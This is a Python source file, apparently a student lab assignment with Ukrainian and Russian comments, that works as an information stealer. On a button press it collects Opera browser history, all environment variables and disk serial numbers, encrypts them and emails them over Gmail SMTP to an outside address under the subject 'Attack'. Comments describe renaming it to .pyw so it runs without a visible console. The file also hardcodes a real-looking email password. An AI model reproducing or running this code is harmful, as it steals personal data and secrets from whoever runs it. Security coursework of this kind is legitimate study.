import os
import pickle
import smtplib
import wmi
from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from tkinter import *
from cryptography.fernet import Fernet


# def write_key():
# # Создаем ключ и сохраняем его в файл
#     key = Fernet.generate_key()
#     with open('crypto.txt', 'wb') as key_file:
#         key_file.write(key)

# a.	історія веб-браузерів (за вибором студента);
# b.	значення змінних оточення;
# c.	інформація про апаратне забезпечення комп’ютера;                 Я НЕ ЕБУ ГДЕ ЭТО ХРАНИТЬСЯ ЧТО-БЫ СПИЗДИТЬ
# d.	серійні номери логічних розділів встановлених жорстких дисків;
# e.	дані про мережеві підключення.                В лекции про это не написано, в инете только громоздкие куски кода

# Если не хочется, что бы открывалась консоль (я так понимаю, это и будет "фоновым режимом"),
# то просто переименуйте .py в .pyw. Но так как теперь консоли не будет, то всякие print
# и другие подобные операции вывода в консоль не будут работать.


root=Tk()

def main():
    def envir_in_data():
        infile = open('lab5/environ.dat', 'wb')  # Открываем файл в режиме wb
        pickle.dump(dict(os.environ), infile)  # Сериализовать объекты и записать в файлы
        infile.close()
        return infile.name

    def send_someone(part1, part2, part3):
            msg = MIMEMultipart()
            msg['From'] = "tekimekikot@gmail.com"
            msg['To'] = "chubarkoartem14@gmail.com"
            msg['Subject'] = "Attack"
            server = smtplib.SMTP('smtp.gmail.com: 587')
            server.starttls()
            server.login(msg['From'], 'Artem-timur152')
            msg.attach(MIMEText("Thank you", 'plain'))
            msg.attach(part1)
            msg.attach(part2)
            msg.attach(part3)
            server.sendmail(msg['From'], msg['To'], msg.as_string())
            server.quit()
            # os.mkdir('lab5')

    def encrypt_all_file():
        key = open('lab5/crypto.txt', 'rb').read()
        fernet = Fernet(key)

        path = os.getenv('USERPROFILE') + '\\AppData\\Roaming\\Opera Software\\Opera Stable\\History'
        if (os.path.exists(path)):                                                                              # a.
            with open(path, "rb") as f:
                enc_text = fernet.encrypt(f.read())
                part1 = MIMEApplication(enc_text, Name='History')

        f = envir_in_data()                                                                                     # b.
        with open(f, "rb") as file:
            enc_text = fernet.encrypt(file.read())
            part2 = MIMEApplication(enc_text, Name=f[0:7])

        c = wmi.WMI()
        for physical_disk in c.Win32_DiskDrive():
            enc_text = fernet.encrypt(bytes(physical_disk.SerialNumber.encode()))                               # d.
        part3 = MIMEApplication(enc_text, Name='SerialNumberDisk')
        send_someone(part1, part2, part3)

    key_ent = Entry(root)
    key_ent.pack()
    start_but = Button(root, text='Применить', command=encrypt_all_file)
    start_but.pack()

    # def decrypt(filename, key):           Функция чтобы расшифровать файлы которые мы получаем на почте
    #    f = Fernet(key)
    #     with open(filename, 'rb') as file:
    #         encrypted_data = file.read()
    #     decrypted_data = f.decrypt(encrypted_data)
    #     with open(filename, 'wb') as file:
    #         file.write(decrypted_data)

    root.mainloop()

if __name__ == '__main__':
    main()